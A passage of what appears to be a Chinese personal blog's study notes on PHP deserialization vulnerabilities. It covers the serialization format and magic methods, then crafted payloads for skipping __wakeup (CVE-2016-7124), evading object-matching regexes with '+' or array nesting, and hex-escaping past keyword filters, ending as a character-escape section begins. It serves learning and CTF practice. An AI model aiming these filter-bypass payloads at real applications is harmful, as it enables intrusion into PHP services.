<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP反序列化学习笔记 | Quuiieet's Blog</title><meta name="author" content="Quuiieet"><meta name="copyright" content="Quuiieet"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="PHP反序列化概念php程序为了保存和转储对象，提供了序列化的方法。php序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。 php序列化的函数为serialize，可以将对象中的成员变量转换成字符串。 反序列化的函数为unserilize，可以将serialize生成的字符串重新还原为对象中的成员变量。 将用户可控的数据">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP反序列化学习笔记">
<meta property="og:url" content="http://holybeagle.github.io/2024/03/10/2024-03-10-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Quuiieet's Blog">
<meta property="og:description" content="PHP反序列化概念php程序为了保存和转储对象，提供了序列化的方法。php序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。 php序列化的函数为serialize，可以将对象中的成员变量转换成字符串。 反序列化的函数为unserilize，可以将serialize生成的字符串重新还原为对象中的成员变量。 将用户可控的数据">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2024-03-09T16:00:00.000Z">
<meta property="article:modified_time" content="2024-07-09T01:55:03.174Z">
<meta property="article:author" content="Quuiieet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://holybeagle.github.io/2024/03/10/2024-03-10-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PHP反序列化学习笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-09 09:55:03'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Quuiieet's Blog"><span class="site-name">Quuiieet's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PHP反序列化学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-09T16:00:00.000Z" title="发表于 2024-03-10 00:00:00">2024-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-09T01:55:03.174Z" title="更新于 2024-07-09 09:55:03">2024-07-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PHP反序列化学习笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>php程序为了保存和转储对象，提供了序列化的方法。php序列化是为了在程序运行的过程中对对象进行转储而产生的。<strong>序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。</strong></p>
<p>php序列化的函数为<code>serialize</code>，可以将对象中的成员变量转换成字符串。</p>
<p>反序列化的函数为<code>unserilize</code>，可以将<code>serialize</code>生成的字符串重新还原为对象中的成员变量。</p>
<p><strong>将用户可控的数据进行了反序列化</strong>，就是PHP反序列化漏洞。</p>
<p><strong>序列化</strong>的目的是方便数据的传输和存储。</p>
<p>在PHP应用中，序列化和反序列化一般用作缓存，比如session缓存，cookie等。通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h4 id="序列化的字母标识"><a href="#序列化的字母标识" class="headerlink" title="序列化的字母标识"></a>序列化的字母标识</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - boolean</span><br><span class="line">d - double</span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br><span class="line">N - NULL</span><br></pre></td></tr></tbody></table></figure>

<h4 id="序列化后的字符串格式"><a href="#序列化后的字符串格式" class="headerlink" title="序列化后的字符串格式"></a>序列化后的字符串格式</h4><p>每一个序列化后的小段都由<code>;</code> 隔开, 使用<code>{}</code>表示层级关系</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>提示符</th>
<th>格式</th>
</tr>
</thead>
<tbody><tr>
<td>字符串</td>
<td><code>s</code></td>
<td>s:长度:”内容”</td>
</tr>
<tr>
<td>已转义字符串</td>
<td><code>S</code></td>
<td>s:长度:”转义后的内容”</td>
</tr>
<tr>
<td>整数</td>
<td><code>i</code></td>
<td>i:数值</td>
</tr>
<tr>
<td>布尔值</td>
<td><code>b</code></td>
<td><code>b:1</code> =&gt; <code>true</code> / <code>b:0</code> =&gt; <code>false</code></td>
</tr>
<tr>
<td>空值</td>
<td><code>N</code></td>
<td>N;</td>
</tr>
<tr>
<td>数组</td>
<td><code>a</code></td>
<td>a:大小:{键序列段;值序列段;&lt;重复多次&gt;}</td>
</tr>
<tr>
<td>对象</td>
<td><code>O</code></td>
<td>O:类型名长度:”类型名称”:成员数:{成员名称序列段;成员值序列段:}</td>
</tr>
<tr>
<td>引用</td>
<td><code>R</code></td>
<td>R:反序列化变量的序号, 从1开始</td>
</tr>
</tbody></table>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。</p>
<h3 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h3><h6 id="construct"><a href="#construct" class="headerlink" title="__construct"></a><code>__construct</code></h6><p>构造函数, 在对应对象实例化时自动被调用. 子类中的构造函数不会隐式调用父类的构造函数.</p>
<p>在 PHP 8 以前, 与类名同名的方法可以作为 <code>__constuct</code> 调用但 <code>__construct</code> 方法优先</p>
<h6 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a><code>__sleep()</code></h6><p>此方法在对象被序列化时会调用。</p>
<p>如果方法存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p>
<h6 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a><code>__wakeup</code></h6><p>与<code>__sleep()</code>相反地，此方法在对象被反序列化时会调用</p>
<h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a><code>__toString</code></h6><p>此方法在对象转化成字符串时会被调用。</p>
<p>当然, 因为 PHP 是一个弱类型语言, 很多情况对象会被隐式转换成字符串, 比如</p>
<ul>
<li><code>==</code> 与字符串比较时会被隐式转换</li>
<li>字符串操作 (str系列函数), 字符串拼接, <code>addslashes</code></li>
<li>一些参数需要为字符串的参数: <code>class_exists</code> , <code>in_array</code>(第一个参数), SQL 预编译语句, <code>md5</code>, <code>sha1</code>等</li>
<li><code>print</code>, <code>echo</code> 函数</li>
</ul>
<p><u>简单示例</u></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 声明一个简单的类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$foo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$foo</span></span>) </span></span><br><span class="line"><span class="function">    </span>{        </span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;foo = <span class="variable">$foo</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>{</span><br><span class="line">    	<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;foo;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>(<span class="string">'Hello'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>以上示例会输出：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__get</span>()			<span class="comment">//在读取某些不可访问或者不存在的字段时触发, 传入参数为字段名称</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>()			<span class="comment">//给不可访问和不存在的字段赋值时触发, 传入的参数第一个为字段名, 第二个为赋值</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()		<span class="comment">//把对象当做函数调用时会使用, 例如 $foo()</span></span><br><span class="line">    			<span class="comment">//不仅限于显式调用, 将其作为回调函数(例如array_map作为第一个参数传入) 也会调用此函数</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()		<span class="comment">//在对不可访问的字段调用 isset 或者 empty 时触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()		<span class="comment">//在对不可访问的字段调用 unset  时触发</span></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()	<span class="comment">//在使用 var_dump, print_r 时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()		<span class="comment">// 在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()	<span class="comment">// 在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__set_state</span>()	<span class="comment">// 调用var_export()导出类时，此静态方法会被调用</span></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()		<span class="comment">// 当对象复制完成时调用</span></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()	<span class="comment">// 尝试加载未定义的类</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>不同的情况下会有不同的顺序。</p>
<ol>
<li>一个对象在其生命周期中一定会走过 <code>destruct</code>, 只有当对象没有被任何变量指向时才会被回收。</li>
</ol>
<p>​	2.当使用 <code>new</code> 关键字来创建一个对象时会调用 <code>construct</code></p>
<p><strong>对于序列化/反序列化时的情况</strong></p>
<p>序列化时会先调用 <code>sleep</code> 再调用 <code>destruct</code>, 故而完整的调用顺序为: <code>sleep</code> -&gt; <code>(变量存在)</code> -&gt; <code>destruct</code></p>
<p>反序列化时如果有 <code>__wakeup</code> 则会调用 <code>__wakeUp</code> 而不是 <code>__construct</code>, 故而逻辑为 <code>__wakeUp/__construct</code> -&gt; (变量存在)</p>
<h2 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="反序列化绕过"></a>反序列化绕过</h2><h4 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h4><p><code>(CVE-2016-7124)</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line"></span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></tbody></table></figure>

<p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行</p>
<p>对于下面这样一个自定义类</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test{</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct(){</span><br><span class="line">        $this-&gt;a = 'abc';</span><br><span class="line">    }</span><br><span class="line">    public function __wakeup(){</span><br><span class="line">        $this-&gt;a='666';</span><br><span class="line">    }</span><br><span class="line">    public function  __destruct(){</span><br><span class="line">        echo $this-&gt;a;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>


<p>如果执行<code>unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');</code></p>
<p>输出结果为<code>666</code></p>
<p>而把对象属性个数的值增大执行<code>unserialize('O:4:"test":2:{s:1:"a";s:3:"abc";}');</code></p>
<p>输出结果为<code>abc</code></p>
<h4 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h4><p><code>preg_match('/^O:\d+/')</code>匹配序列化字符串是否是对象字符串开头</p>
<p>有些时候我们会看到<code>^O:\d+</code> 这种的正则表达式, 要求开头不能为对象反序列化</p>
<p>这种情况我们有以下绕过手段</p>
<ol>
<li>由于<code>\d</code>只判断了是否为数字, 则可以在个数前<strong>添加<code>+</code>号</strong>来绕过正则表达式</li>
<li>将这个对象嵌套在其他类型的反序列化之中, 例如数组</li>
</ol>
<h5 id="利用加号绕过"><a href="#利用加号绕过" class="headerlink" title="利用加号绕过"></a>利用加号绕过</h5><p>（注意在url里传参时+要编码为%2B）</p>
<p><code>serialize(array(a)) ;</code> //a为要反序列化的对象</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test{</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct(){</span><br><span class="line">        $this-&gt;a = 'abc';</span><br><span class="line">    }</span><br><span class="line">    public function  __destruct(){</span><br><span class="line">        echo $this-&gt;a.PHP_EOL;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function match($data){</span><br><span class="line">    if (preg_match('/^O:\d+/',$data)){</span><br><span class="line">        die('you lose!');</span><br><span class="line">    }else{</span><br><span class="line">        return $data;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';</span><br><span class="line">// +号绕过</span><br><span class="line">$b = str_replace('O:4','O:+4', $a);</span><br><span class="line">unserialize(match($b));</span><br><span class="line">// serialize(array($a));</span><br><span class="line">unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h4 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h4><pre><code>&lt;?php
class test{
    public $a;
    public $b;
    public function __construct(){
        $this-&gt;a = 'abc';
        $this-&gt;b= &amp;$this-&gt;a;
    }
    public function  __destruct(){
    if($this-&gt;a===$this-&gt;b){
        echo 666;
    }
  }
}
$a = serialize(new test());
</code></pre>
<p>这个例子将$b设置为$a的引用，可以使$a永远与$b相等（相当于指针）</p>
<h4 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}</span><br><span class="line">可以写成</span><br><span class="line">O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}</span><br><span class="line">表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以使用十六进制搭配上已转义字符串来绕过对某些字符的检测，例如:</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name == <span class="string">"flag"</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You did it!"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="string">"flag"</span>) === <span class="literal">false</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You can't do it!"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里检测了是否包含 <code>flag</code> 字符, 可以尝试使用 <code>flag</code> 的十六进制 <code>\66\6c\61\67</code> 来绕过, 构造以下:</p>
<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'O:<span class="number">4</span>:<span class="string">"Read"</span>:<span class="number">1</span>:{s:<span class="number">4</span>:<span class="string">"name"</span>;S:<span class="number">4</span>:<span class="string">"\66\6c\61\67"</span>;}'</span><br></pre></td></tr></tbody></table></figure>

<p> Python 脚本可以将字符串转换为 Hex</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">'Enter a string: '</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'\\'</span> + <span class="built_in">str</span>.encode(<span class="string">'utf-8'</span>).<span class="built_in">hex</span>(<span class="string">'\\'</span>))</span><br></pre></td></tr></tbody></table></figure>

<h4 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h4><h5 id="情况1：过滤后字符变多"><a href="#情况1：过滤后字符变多" class="headerlink" title="情况1：过滤后字符变多"></a>情况1：过滤后字符变多</h5><p>本地的php代码，把反序列化后的一个x替换成为两个</p>
